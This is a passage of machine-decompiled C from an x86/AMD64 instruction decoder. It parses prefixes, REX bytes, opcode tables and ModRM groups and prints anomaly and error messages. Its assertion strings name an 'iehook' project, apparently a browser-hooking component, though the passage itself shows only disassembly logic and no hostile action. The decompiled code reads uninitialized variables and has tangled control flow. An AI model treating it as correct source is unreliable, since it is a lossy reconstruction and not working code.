                *v105 = v106 | 2;
                char * v107 = (char *)(v104 + 96); // 0x1000bac1
                char v108 = *v107; // 0x1000bac1
                unsigned char v109 = v108 & 15;
                if (v109 == 2) {
                    // 0x1000bae4
                    *v107 = v108 & -16 | 4;
                    v52 = v103;
                    v48 = 0;
                    v50 = v104;
                } else {
                    int32_t v110 = (int32_t)v109 - 4; // 0x1000bacf
                    if (v110 != 0) {
                        // 0x1000bec5
                        *v26 = 1077;
                        v7 = v53;
                        goto lab_0x1000fdb2;
                    }
                    // 0x1000bad8
                    *v107 = v108 & -16 | 2;
                    v52 = v103;
                    v48 = v110;
                    v50 = v104;
                }
            }
            goto lab_0x1000be37;
        }
        case 75: {
            int32_t v111 = v42; // 0x1000baf7
            if ((v44 & 16) == 0) {
                // 0x1000baf9
                v111 = v42;
                if ((*(char *)(v42 + 93) & 4) != 0) {
                    char v112 = v44; // 0x1000bb03
                    int32_t v113 = v42; // 0x1000bb03
                    if (v6 == 0) {
                        uint32_t v114 = *v8; // 0x1000bb05
                        uint32_t v115 = *v25 + v114; // 0x1000bb0c
                        *v26 = *v27 + v114 / 0x80000000 + (int32_t)(v115 < v114);
                        *v28 = v115;
                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: Conflicting prefix\n";
                        _printf((char *)&g173);
                        v112 = *v14;
                        v113 = v24;
                    }
                    // 0x1000bb2a
                    *v14 = v112 | 16;
                    v111 = v113;
                }
            }
            int32_t v116 = v111;
            char * v117 = (char *)(v116 + 93); // 0x1000bb31
            char v118 = *v117; // 0x1000bb31
            v52 = v51;
            v48 = v43;
            v50 = v116;
            if ((v118 & 4) == 0) {
                // 0x1000bb3c
                *v117 = v118 | 4;
                char * v119 = (char *)(v116 + 96);
                unsigned char v120 = *v119; // 0x1000bb41
                unsigned char v121 = v120 / 16;
                int32_t v122 = 0; // 0x1000bb54
                switch (v121) {
                    case 4: {
                        int32_t v123 = *v1; // 0x1000bb69
                        char v124 = v120; // 0x1000bb70
                        char * v125 = v119; // 0x1000bb70
                        int32_t v126 = v116; // 0x1000bb70
                        if (*(int32_t *)(v123 + 4) == 3) {
                            // 0x1000bb72
                            *v26 = 1096;
                            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *v29 = (int32_t)L"!IS_AMD64()";
                            __wassert();
                            v124 = *v45;
                            v125 = v45;
                            v126 = v24;
                        }
                        // 0x1000bb8c
                        *v125 = v124 & 15 | 32;
                        v52 = v51;
                        v48 = v123;
                        v50 = v126;
                        // break -> 0x1000be37
                        break;
                    }
                    default: {
                        // 0x1000bb54
                        v122 = (int32_t)v121 - 8;
                        if (v122 != 0) {
                            // 0x1000becf
                            *v26 = 1103;
                            v7 = v53;
                            goto lab_0x1000fdb2;
                        }
                    }
                    case 2: {
                        // 0x1000bb5d
                        *v119 = v120 & 15 | 64;
                        v52 = v51;
                        v48 = v122;
                        v50 = v116;
                        // break -> 0x1000be37
                        break;
                    }
                }
            }
            goto lab_0x1000be37;
        }
        default: {
            // 0x1000bf0c
            *v26 = 1180;
            v7 = v53;
            goto lab_0x1000fdb2;
        }
    }
  lab_0x1000d155:;
    // 0x1000d155
    int32_t v127; // 0x1000b7b0
    int32_t v128 = v127 + 1; // 0x1000d155
    v127 = v128;
    if (v128 >= *v31) {
        goto lab_0x1000d165;
    }
    goto lab_0x1000d0d0;
  lab_0x1000f609:;
    // 0x1000f609
    int32_t v135; // 0x1000b7b0
    int32_t v136 = v135 + 1; // 0x1000f60c
    int32_t v137 = v136; // 0x1000f619
    int32_t v138; // 0x1000b7b0
    int32_t v139 = v138 + 112; // 0x1000f619
    int32_t * v140; // 0x1000cfd3
    if (v136 >= *v140) {
        // break -> 0x1000f61f
        goto lab_0x1000f61f_2;
    }
    goto lab_0x1000f320;
  lab_0x1000f405:;
    char v160 = *(char *)(a1 + 772); // 0x1000f405
    int16_t * v161 = (int16_t *)(v138 + 6);
    if (v160 == 0) {
        uint16_t v162 = *v161;
        int16_t v163 = v162; // 0x1000f414
        if (v162 >= 256) {
            // 0x1000f416
            *v26 = 2303;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"Operand->Length <= 0xFF";
            __wassert();
            int16_t v164 = *v161;
            v163 = v164;
        }
        int16_t v165 = v163; // 0x1000f42d
        char * v166; // 0x1000b7b0
        if (v165 == 0) {
            char v167 = *v45; // 0x1000f43c
            char v168 = v167 & 15; // 0x1000f43f
            *v166 = v168;
        } else {
            // 0x1000f434
            int32_t v169; // 0x1000b7b0
            char v170 = *(char *)v169; // 0x1000f434
            *v166 = v170;
        }
    }
    unsigned char v171 = v160; // 0x1000f445
    uint16_t v172 = *v161; // 0x1000f448
    char * v147; // 0x1000d7b5
    if ((*v147 & 64) == 0) {
        // 0x1000f467
        *v26 = 2309;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"X86Instruction->HasFullDisplacement";
        __wassert();
    }
    uint32_t v173 = v172 < (int16_t)v171 ? (int32_t)v171 : (int32_t)v172;
    int32_t * v144; // 0x1000b7b0
    int32_t v174 = *v144; // 0x1000f481
    int32_t v175 = v174; // 0x1000f487
    int32_t v141; // 0x1000b7b0
    int32_t v176 = v141; // 0x1000f487
    int32_t * v150; // 0x1000b7b0
    int32_t * v151; // 0x1000b7b0
    int32_t * v152; // 0x1000b7b0
    int32_t * v153; // 0x1000b7b0
    int32_t * v154; // 0x1000b7b0
    char * v177; // 0x1000b7b0
    int32_t * v178; // 0x1000b7b0
    int32_t * v179; // 0x1000b7b0
    if ((v174 & 0x4000) != 0) {
        // 0x1000f48d
        if (*v150 != 0) {
            // 0x1000f496
            *v26 = 2312;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"!Instruction->DataDst.Count";
            __wassert();
        }
        if (v173 >= 17) {
            // 0x1000f4b5
            *v26 = 2313;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"tmpScale <= 16";
            __wassert();
        }
        // 0x1000f4cf
        *v177 = *v177 & 7 | 8 * (char)v173;
        *v151 = *v178;
        *v152 = *v179;
        uint32_t v180 = *v178 + v173; // 0x1000f4fe
        *(int32_t *)(a1 + 840) = v180;
        *(int32_t *)(a1 + 844) = *v179 + (int32_t)(v180 < v173);
        uint32_t v181 = 2 * v173; // 0x1000f510
        uint32_t v182 = *v178 + v181; // 0x1000f515
        *(int32_t *)(a1 + 848) = v182;
        *(int32_t *)(a1 + 852) = *v179 + (int32_t)(v182 < v181);
        *v150 = 3;
        *v153 = (int32_t)*v161;
        *v154 = v138;
        v175 = *v144;
        v176 = 3;
    }
    // 0x1000f545
    v135 = v176;
    int32_t v159; // 0x1000b7b0
    int16_t * v158; // 0x1000b7b0
    int32_t * v155; // 0x1000b7b0
    int32_t * v156; // 0x1000b7b0
    int32_t * v157; // 0x1000b7b0
    if ((v175 & 0x2000) == 0) {
        goto lab_0x1000f609;
    } else {
        // 0x1000f551
        if (*v155 != 0) {
            // 0x1000f55a
            *v26 = 2322;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"!Instruction->DataSrc.Count";
            __wassert();
        }
        if (v173 >= 17) {
            // 0x1000f579
            *v26 = 2323;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"tmpScale <= 16";
            __wassert();
        }
        // 0x1000f593
        *v177 = *v177 & 7 | 8 * (char)v173;
        *v156 = *v178;
        *v157 = *v179;
        uint32_t v183 = *v178 + v173; // 0x1000f5c2
        *(int32_t *)(a1 + 800) = v183;
        *(int32_t *)(a1 + 804) = *v179 + (int32_t)(v183 < v173);
        uint32_t v184 = 2 * v173; // 0x1000f5d4
        uint32_t v185 = *v178 + v184; // 0x1000f5d9
        *(int32_t *)(a1 + 808) = v185;
        *(int32_t *)(a1 + 812) = *v179 + (int32_t)(v185 < v184);
        *v155 = 3;
        v158 = v161;
        v159 = 3;
        goto lab_0x1000f603;
    }
  lab_0x1000f603:
    // 0x1000f603
    *(int32_t *)(a1 + 820) = (int32_t)*v158;
    *(int32_t *)(a1 + 824) = v138;
    v135 = v159;
    goto lab_0x1000f609;
  lab_0x1000da7c:;
    // 0x1000da7c
    int32_t * v186; // 0x1000b7b0
    *v186 = 1;
    int32_t v187 = *v31; // 0x1000da7c
    goto lab_0x1000da7f;
  lab_0x1000da7f:;
    // 0x1000da7f
    int32_t v188; // 0x1000b7b0
    int32_t v189 = v188 + 1; // 0x1000da7f
    int32_t v190 = v187; // 0x1000da87
    int32_t v191 = v189; // 0x1000da87
    if (v189 >= v187) {
        // break -> 0x1000da8d
        goto lab_0x1000da8d;
    }
    goto lab_0x1000d9d0;
  lab_0x1000bb9b:;
    char v207 = v44; // 0x1000bba2
    int32_t v208 = v42; // 0x1000bba2
    if ((v44 & 16) == 0) {
        // 0x1000bba4
        v207 = v44;
        v208 = v42;
        if ((*(char *)(v42 + 93) & 8) != 0) {
            char v209 = v44; // 0x1000bbae
            int32_t v210 = v42; // 0x1000bbae
            if (v6 == 0) {
                uint32_t v211 = *v8; // 0x1000bbb0
                uint32_t v212 = *v25 + v211; // 0x1000bbb7
                *v26 = *v27 + v211 / 0x80000000 + (int32_t)(v212 < v211);
                *v28 = v212;
                *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected segment override\n";
                _printf((char *)&g173);
                v209 = *v14;
                v210 = v24;
            }
            char v213 = v209 | 16; // 0x1000bbd5
            *v14 = v213;
            v207 = v213;
            v208 = v210;
        }
    }
    int32_t v214 = v208;
    int32_t v215 = *v1; // 0x1000bbdc
    v46 = v207;
    v47 = v215;
    v49 = v214;
    if (*(int32_t *)(v215 + 4) == 3) {
        goto lab_0x1000bbf5;
    } else {
        char * v216 = (char *)(v214 + 93); // 0x1000bbe5
        *v216 = *v216 | 8;
        *(int32_t *)(v214 + 72) = 0;
        v52 = v51;
        v48 = v215;
        v50 = v214;
        goto lab_0x1000be37;
    }
  lab_0x1000bbf5:;
    int32_t v217 = v49;
    int32_t v218 = v47;
    char v219 = v46; // 0x1000bbf5
    v52 = v51;
    v48 = v218;
    v50 = v217;
    if ((v219 & 16) == 0) {
        char v220 = v219; // 0x1000bc06
        int32_t v221 = v217; // 0x1000bc06
        if (v6 == 0) {
            uint32_t v222 = *v8; // 0x1000bc08
            uint32_t v223 = *v25 + v222; // 0x1000bc0f
            *v26 = *v27 + v222 / 0x80000000 + (int32_t)(v223 < v222);
            *v28 = v223;
            *v29 = (int32_t)"[0x%08I64X] ANOMALY: Meaningless segment override\n";
            _printf((char *)&g173);
            v220 = *v14;
            v221 = v24;
        }
        // 0x1000bc2d
        *v14 = v220 | 16;
        v52 = v51;
        v48 = v218;
        v50 = v221;
    }
    goto lab_0x1000be37;
  lab_0x1000be37:;
    uint32_t v224 = *v31; // 0x1000be37
    if (v224 >= 15) {
        goto lab_0x1000bed9;
    }
    int32_t v225 = v50;
    char v226; // 0x1000b7b0
    int32_t v227; // 0x1000b7b0
    if (v224 != 4) {
        // 0x1000be46
        v226 = *v14;
        v227 = v225;
    } else {
        int32_t v228 = v225; // 0x1000be4f
        if (v6 == 0) {
            // 0x1000be51
            *v26 = v224;
            uint32_t v229 = *v8; // 0x1000be52
            uint32_t v230 = *v25 + v229; // 0x1000be59
            *v28 = *v27 + v229 / 0x80000000 + (int32_t)(v230 < v229);
            *v29 = v230;
            *v30 = (int32_t)"[0x%08I64X] ANOMALY: Reached maximum prefix count %d\n";
            _printf((char *)&g173);
            v228 = v24;
        }
        char v231 = *v14 | 16; // 0x1000be77
        *v14 = v231;
        v226 = v231;
        v227 = v228;
    }
    int32_t v232 = v227;
    int32_t v233 = v232; // 0x1000be85
    if ((v226 & 16) == 0) {
        // 0x1000be87
        v233 = v232;
        if (*v31 >= 4) {
            // 0x1000be90
            *v26 = 1195;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"Instruction->AnomalyOccurred || Instruction->PrefixCount < X86_MAX_PREFIX_LENGTH";
            __wassert();
            v233 = v24;
        }
    }
    // 0x1000beaa
    *(char *)(*v31 + v32) = v21;
    *v31 = *v31 + 1;
    char v234 = v52; // 0x1000bec0
    int32_t v235; // 0x1000b8ad
    int32_t v236 = v235; // 0x1000bec0
    int32_t v237 = v48 & -256 | v10; // 0x1000bec0
    int32_t v238 = v233; // 0x1000bec0
    goto lab_0x1000b890;
  lab_0x1000fdb2:
    // 0x1000fdb2
    *(int32_t *)(v7 - 4) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *(int32_t *)(v7 - 8) = (int32_t)&g3;
    __wassert();
    int32_t v254 = v7 + 4; // 0x1000fdc1
    goto lab_0x1000fdc4;
  lab_0x1000fdc4:
    if (v6 != 0) {
        // 0x1000fddb
        return 0;
    }
    // 0x1000fdca
    *(int32_t *)(v254 - 4) = ___iob_func() + 32;
    _fflush((struct _IO_FILE *)&g173);
    // 0x1000fddb
    return 0;
  lab_0x1000b87a:;
    int32_t * v255 = (int32_t *)(v2 + 944); // 0x1000b87a
    *v255 = *v255 + 1;
    v14 = (char *)(a1 + 916);
    if ((a3 & 32) != 0) {
        // 0x1000b886
        *v14 = *v14 | 1;
    }
    // 0x1000b88d
    v24 = a1 + 680;
    int32_t v256; // bp-64, 0x1000b7b0
    int32_t v257 = &v256; // 0x1000b827
    int32_t * v243 = (int32_t *)(a1 + 296);
    v25 = (int32_t *)(a1 + 272);
    v53 = v257 - 4;
    v26 = (int32_t *)v53;
    v27 = (int32_t *)(a1 + 276);
    v28 = (int32_t *)(v257 - 8);
    v29 = (int32_t *)(v257 - 12);
    v30 = (int32_t *)(v257 - 16);
    v31 = (int32_t *)(a1 + 316);
    v32 = a1 + 300;
    v45 = (char *)(a1 + 776);
    v234 = 0;
    v236 = a2;
    v237 = v3;
    v238 = v24;
    bool v245; // 0x1000b7b0
    int32_t v242; // 0x1000b7b0
    while (true) {
      lab_0x1000b890:
        // 0x1000b890
        v51 = v234;
        int32_t v239 = v236; // 0x1000b7b0
        int32_t v240 = v237; // 0x1000b7b0
        int32_t v241 = v238;
        while (true) {
            // 0x1000b890
            v18 = v241;
            v242 = v239;
            v21 = *(char *)v239;
            v10 = v21;
            g164 = v240 & -256 | v10;
            *v243 = *v243 + 1;
            int32_t v244 = *v1; // 0x1000b8aa
            v235 = v242 + 1;
            v245 = false;
            v12 = v244;
            if (*(int32_t *)(v244 + 4) != 3) {
                // break (via goto) -> 0x1000b926
                goto lab_0x1000b926_3;
            }
            if ((v21 & -16) != 64) {
                // 0x1000b926
                v245 = true;
                v12 = v244 & -256;
                goto lab_0x1000b926_3;
            }
            unsigned char v246 = *(char *)v235; // 0x1000b8cc
            int32_t v247 = v246; // 0x1000b8cc
            int32_t v248 = 7 * v247; // 0x1000b8d6
            v245 = true;
            v12 = v248;
            if (*(int32_t *)(56 * v247 + (int32_t)&g53) != 0x40000000) {
                // break (via goto) -> 0x1000b926
                goto lab_0x1000b926_3;
            }
            char v249 = *v14; // 0x1000b8e5
            while ((v249 & 16) != 0) {
                // 0x1000b890
                v242 = v235;
                v21 = v246;
                v10 = v21;
                g164 = v248 & -256 | v10;
                *v243 = *v243 + 1;
                v244 = *v1;
                v235 = v242 + 1;
                v245 = false;
                v12 = v244;
                if (*(int32_t *)(v244 + 4) != 3) {
                    // break (via goto) -> 0x1000b926
                    goto lab_0x1000b926_3;
                }
                if ((v21 & -16) != 64) {
                    // 0x1000b926
                    v245 = true;
                    v12 = v244 & -256;
                    goto lab_0x1000b926_3;
                }
                // 0x1000b8cc
                v246 = *(char *)v235;
                v247 = v246;
                v248 = 7 * v247;
                v245 = true;
                v12 = v248;
                if (*(int32_t *)(56 * v247 + (int32_t)&g53) != 0x40000000) {
                    // break (via goto) -> 0x1000b926
                    goto lab_0x1000b926_3;
                }
                // 0x1000b8e5
                v249 = *v14;
            }
            char v250 = v249; // 0x1000b8f2
            int32_t v251 = v18; // 0x1000b8f2
            if (v6 == 0) {
                uint32_t v252 = *v8; // 0x1000b8f4
                uint32_t v253 = *v25 + v252; // 0x1000b8fb
                *v26 = v10;
                *v28 = *v27 + v252 / 0x80000000 + (int32_t)(v253 < v252);
                *v29 = v253;
                *v30 = (int32_t)"[0x%08I64X] ANOMALY: REX prefix before legacy prefix 0x%02X\n";
                _printf((char *)(56 * v10 + (int32_t)&g52));
                v250 = *v14;
                v251 = v24;
            }
            // 0x1000b91a
            v241 = v251;
            *v14 = v250 | 16;
            v239 = v235;
            v240 = v248;
        }
        goto lab_0x1000b926_3;
    }
  lab_0x1000bf16:;
    int32_t v258 = v11 + (int32_t)&g52;
    char * v259 = (char *)v258;
    int32_t v260 = v10; // 0x1000bf1d
    int32_t v261 = v235; // 0x1000bf1d
    char v262 = v21; // 0x1000bf1d
    char * v263 = v259; // 0x1000bf1d
    int32_t v264 = v18; // 0x1000bf1d
    int32_t v265 = v258; // 0x1000bf1d
    if ((v21 & -16) == 64 == v245) {
        uint32_t v266 = *v31; // 0x1000bf32
        if (v266 >= 15) {
          lab_0x1000bed9:
            if (v6 != 0) {
                // 0x1000fddb
                return 0;
            }
            uint32_t v267 = *v8; // 0x1000bee3
            uint32_t v268 = *v25 + v267; // 0x1000beea
            *v26 = 4;
            *v28 = *v27 + v267 / 0x80000000 + (int32_t)(v268 < v267);
            *v29 = v268;
            *v30 = (int32_t)"[0x%08I64X] ERROR: Reached maximum prefix count %d\n";
            _printf((char *)&g173);
            // 0x1000fdca
            *v26 = ___iob_func() + 32;
            _fflush((struct _IO_FILE *)&g173);
            // 0x1000fddb
            return 0;
        }
        char v269 = *v14; // 0x1000bf3d
        int32_t v270 = v18; // 0x1000bf44
        if ((v269 & 16) == 0) {
            if (v266 != 5) {
                // 0x1000bf88
                v270 = v18;
                if (v266 >= 5) {
                    // 0x1000bf91
                    *v26 = 1222;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"Instruction->AnomalyOccurred || Instruction->PrefixCount < AMD64_MAX_PREFIX_LENGTH";
                    __wassert();
                    v270 = v24;
                }
            } else {
                char v271 = v269; // 0x1000bf4f
                int32_t v272 = v18; // 0x1000bf4f
                if (v6 == 0) {
                    uint32_t v273 = *v8; // 0x1000bf51
                    uint32_t v274 = *v25 + v273; // 0x1000bf58
                    *v26 = 4;
                    *v28 = *v27 + v273 / 0x80000000 + (int32_t)(v274 < v273);
                    *v29 = v274;
                    *v30 = (int32_t)"[0x%08I64X] ANOMALY: Reached maximum prefix count %d\n";
                    _printf(v259);
                    v271 = *v14;
                    v272 = v24;
                }
                // 0x1000bf7f
                *v14 = v271 | 16;
                v270 = v272;
            }
        }
        // 0x1000bfab
        *(char *)(*v31 + v32) = v21;
        *v31 = *v31 + 1;
        *(char *)(v270 + 64) = v21;
        char * v275 = (char *)(v270 + 65);
        char v276 = *v275 & 15 | 2 * (4 * (4 * (v21 & 2 | 4 * v21) | v21 & 4) | v21 & 8); // 0x1000bfee
        *v275 = v276;
        char v277 = v276; // 0x1000bffc
        int32_t v278 = v270; // 0x1000bffc
        if (*(char *)(v270 + 96) < 64) {
            // 0x1000bffe
            *v26 = 1230;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"X86Instruction->AddressSize >= 4";
            __wassert();
            v277 = *(char *)(a1 + 745);
            v278 = v24;
        }
        int32_t v279 = v278;
        int32_t v280; // 0x1000b7b0
        if ((v277 & 16) == 0) {
            // 0x1000c02e
            if ((*(char *)(v279 + 93) & 2) == 0) {
                char * v281 = (char *)(v279 + 64);
                v280 = v279;
                if (*v281 == 64) {
                    char v282 = *v14; // 0x1000c061
                    char * v283 = v281; // 0x1000c068
                    int32_t v284 = v279; // 0x1000c068
                    if ((v282 & 16) == 0) {
                        char * v285 = v281; // 0x1000c06e
                        char v286 = v282; // 0x1000c06e
                        int32_t v287 = v279; // 0x1000c06e
                        if (v6 == 0) {
                            uint32_t v288 = *v8; // 0x1000c070
                            uint32_t v289 = *v25 + v288; // 0x1000c077
                            *v26 = *v27 + v288 / 0x80000000 + (int32_t)(v289 < v288);
                            *v28 = v289;
                            *v29 = (int32_t)"[0x%08I64X] ANOMALY: meaningless REX prefix used\n";
                            _printf((char *)&g173);
                            v285 = (char *)(a1 + 744);
                            v286 = *v14;
                            v287 = v24;
                        }
                        // 0x1000c095
                        *v14 = v286 | 16;
                        v283 = v285;
                        v284 = v287;
                    }
                    // 0x1000c09c
                    *v283 = 0;
                    v280 = v284;
                }
            } else {
                // 0x1000c034
                v280 = v279;
                if ((*(char *)(v279 + 96) & 15) != 2) {
                    // 0x1000c03f
                    *v26 = 1238;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"X86Instruction->OperandSize == 2";
                    __wassert();
                    v280 = v24;
                }
            }
        } else {
            char * v290 = (char *)(v279 + 96); // 0x1000c01e
            char * v291 = (char *)(v279 + 93); // 0x1000c025
            *v291 = *v291 & -3;
            *v290 = *v290 & -16 | 8;
            v280 = v279;
        }
        char v292 = *(char *)v235; // 0x1000c0a3
        int32_t v293 = v292;
        *v243 = *v243 + 1;
        int32_t v294 = v242 + 2; // 0x1000c0ae
        int32_t v295 = 56 * v293; // 0x1000c0be
        int32_t v296 = v295 + (int32_t)&g52; // 0x1000c0c9
        char * v297 = (char *)v296; // 0x1000c0d0
        v260 = v293;
        v261 = v294;
        v262 = v292;
        v263 = v297;
        v264 = v280;
        v265 = v296;
        if (*(int32_t *)(v295 + (int32_t)&g53) == 0x40000000) {
            // 0x1000c0d5
            *v26 = 1254;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"!X86_PREFIX(X86Opcode)";
            __wassert();
            v260 = v293;
            v261 = v294;
            v262 = v292;
            v263 = v297;
            v264 = v24;
            v265 = v296;
        }
    }
    int32_t v298 = v265;
    int32_t v299 = v264;
    char * v300 = v263;
    char v301 = v262;
    int32_t v302 = v261;
    int32_t v303 = v260;
    char * v304 = (char *)(a1 + 320); // 0x1000c0f9
    *v304 = v301;
    *(int32_t *)(a1 + 292) = v302 - 1;
    int32_t * v305 = (int32_t *)(v298 + 8);
    if (*v305 == 0) {
        // 0x1000c10b
        if (*(int32_t *)v298 == 0) {
            if (v6 != 0) {
                // 0x1000fddb
                return 0;
            }
            uint32_t v306 = *v8; // 0x1000c11d
            *v26 = v303;
            uint32_t v307 = *v25 + v306; // 0x1000c125
            *v28 = *v27 + v306 / 0x80000000 + (int32_t)(v307 < v306);
            *v29 = v307;
            *v30 = (int32_t)"[0x%08I64X] ERROR: Invalid opcode 0x%02X\n";
            _printf((char *)&g173);
            // 0x1000fdca
            *v26 = ___iob_func() + 32;
            _fflush((struct _IO_FILE *)&g173);
            // 0x1000fddb
            return 0;
        }
    }
    int32_t v308; // 0x1000b7b0
    int32_t v309; // 0x1000b7b0
    int32_t v310; // 0x1000b7b0
    int32_t v311; // 0x1000b7b0
    int32_t v312; // 0x1000b7b0
    int32_t v313; // 0x1000b7b0
    int32_t v314; // 0x1000b7b0
    char * v315; // 0x1000b7b0
    char * v316; // 0x1000b7b0
    char * v317; // 0x1000b7b0
    int32_t v318; // 0x1000b7b0
    int32_t v319; // 0x1000b7b0
    int32_t v320; // 0x1000b7b0
    char v321; // 0x1000b7b0
    char v322; // 0x1000b7b0
    char v323; // 0x1000b7b0
    int32_t v324; // 0x1000c173
    int32_t v325; // 0x1000c1bd
    int32_t v326; // 0x1000c1c6
    int32_t v327; // 0x1000c17b
    char * v328; // 0x1000c2b2
    char * v329; // 0x1000b7b0
    char * v330; // 0x1000c1d2
    char * v331; // 0x1000c2d8
    char * v332; // 0x1000c2df
    int32_t v333; // 0x1000c2ef
    int32_t * v334; // 0x1000c14d
    if (v301 != 15) {
        char v335 = *(char *)(v299 + 96); // 0x1000c76c
        if ((v335 & -16) == -128) {
            // 0x1000c77c
            if (*(char *)(v303 + (int32_t)&g66) != 0) {
                if (v6 != 0) {
                    // 0x1000fddb
                    return 0;
                }
                uint32_t v336 = *v8; // 0x1000c792
                uint32_t v337 = *v25 + v336; // 0x1000c79c
                *v26 = v298 + 12;
                *v28 = v303;
                *v29 = *v27 + v336 / 0x80000000 + (int32_t)(v337 < v336);
                *v30 = v337;
                *(int32_t *)(v257 - 20) = (int32_t)"[0x%08I64X] ERROR: Opcode 0x%02X (\"%s\") illegal in 64-bit mode\n";
                _printf((char *)&g173);
                // 0x1000fdca
                *v26 = ___iob_func() + 32;
                _fflush((struct _IO_FILE *)&g173);
                // 0x1000fddb
                return 0;
            }
        }
        if ((v335 & 15) == 2) {
            // 0x1000c7c4
            if (*(char *)(v303 + (int32_t)&g80) != 0) {
                if (v6 != 0) {
                    // 0x1000fddb
                    return 0;
                }
                // 0x1000c7da
                *v26 = v298 + 12;
                *v28 = v303;
                uint32_t v338 = *v8; // 0x1000c7df
                uint32_t v339 = *v25 + v338; // 0x1000c7e6
                *v29 = *v27 + v338 / 0x80000000 + (int32_t)(v339 < v338);
                *v30 = v339;
                *(int32_t *)(v257 - 20) = (int32_t)"[0x%08I64X] ERROR: Opcode 0x%02X (\"%s\") illegal with 16-bit operand size\n";
                _printf((char *)&g173);
                // 0x1000fdca
                *v26 = ___iob_func() + 32;
                _fflush((struct _IO_FILE *)&g173);
                // 0x1000fddb
                return 0;
            }
        }
        // 0x1000c806
        *(char *)(a1 + 321) = v301;
        *(int32_t *)(a1 + 324) = 1;
        char * v340 = (char *)(v299 + 94); // 0x1000c825
        char v341 = 8 * *(char *)(v303 + (int32_t)&g58) & 8;
        *v340 = v341 | *v340 & -9;
        if (v341 != 0) {
            // 0x1000c836
            *(char *)(v299 + 61) = *(char *)v302;
        }
        int32_t * v342 = (int32_t *)v298; // 0x1000c83e
        if (*v342 == 0) {
            int32_t v343 = *v305; // 0x1000c956
            v308 = v343;
            v321 = 0;
            v312 = v302;
            v316 = v300;
            v318 = v303;
            v310 = v299;
            v311 = v298;
            v323 = 0;
            v314 = v302;
            v315 = v300;
            v320 = v303;
            if ((v343 & -0x48000000) == 0) {
                goto lab_0x1000ce72;
            } else {
                goto lab_0x1000c968;
            }
        } else {
            int32_t v344 = v299; // 0x1000c84b
            if ((*v340 & 8) == 0) {
                // 0x1000c84d
                *v26 = 1470;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)L"X86Instruction->HasModRM";
                __wassert();
                v344 = v24;
            }
            int32_t v345 = v344;
            char v346 = *(char *)v302 / 8 & 7; // 0x1000c86f
            int32_t v347 = *v305; // 0x1000c871
            v308 = v347;
            v321 = v346;
            v312 = v302;
            v316 = v300;
            v318 = v303;
            v310 = v345;
            v311 = v298;
            if ((v347 & -0x48000000) != 0) {
                goto lab_0x1000c968;
            } else {
                int32_t v348 = *v342; // 0x1000c881
                int32_t v349 = v348; // 0x1000c884
                int32_t v350 = v345; // 0x1000c884
                if (v348 == 0) {
                    // 0x1000c886
                    *v26 = 1480;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"X86Opcode->Table";
                    __wassert();
                    v349 = *v342;
                    v350 = v24;
                }
                int32_t v351 = v346; // 0x1000c86f
                int32_t v352 = v349 + 56 * v351;
                char * v353 = (char *)v352; // 0x1000c8b9
                if (*(int32_t *)(v352 + 8) == 0) {
                    // 0x1000c8be
                    if (*(int32_t *)v352 == 0) {
                        // 0x1000c8c3
                        *v243 = *v243 + 1;
                        if (v6 != 0) {
                            // 0x1000fddb
                            return 0;
                        }
                        // 0x1000c8d3
                        *v26 = v351;
                        uint32_t v354 = *v8; // 0x1000c8d7
                        *v28 = v303;
                        uint32_t v355 = *v25 + v354; // 0x1000c8df
                        *v29 = *v27 + v354 / 0x80000000 + (int32_t)(v355 < v354);
                        *v30 = v355;
                        *(int32_t *)(v257 - 20) = (int32_t)"[0x%08I64X] ERROR: Invalid group opcode 0x%02X extension 0x%02X\n";
                        _printf(v353);
                        // 0x1000fdca
                        *v26 = ___iob_func() + 32;
                        _fflush((struct _IO_FILE *)&g173);
                        // 0x1000fddb
                        return 0;
                    }
                }
                char v356 = *(char *)(v303 + (int32_t)&g63); // 0x1000c902
                char * v357 = (char *)(v350 + 97); // 0x1000c90e
                *v357 = 4 * v356 & 124 | *v357 & -125;
                if (v356 >= 18) {
                    // 0x1000c922
                    *v26 = 1492;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"Group > 0 && Group <= 17";
                    __wassert();
                }
                // 0x1000c939
                v323 = v346;
                v314 = v302;
                v315 = v353;
                v320 = v303;
                if (v352 != -12) {
                    goto lab_0x1000ce72;
                } else {
                    // 0x1000c942
                    *v26 = 1493;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"X86Opcode->Mnemonic";
                    v322 = v346;
                    v313 = v302;
                    v317 = v353;
                    v319 = v303;
                    goto lab_0x1000ce6a;
                }
            }
        }
    } else {
        // 0x1000c14d
        v334 = (int32_t *)(a1 + 324);
        int32_t v358 = v299; // 0x1000c154
        if (*v334 != 0) {
            // 0x1000c156
            *v26 = 1271;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
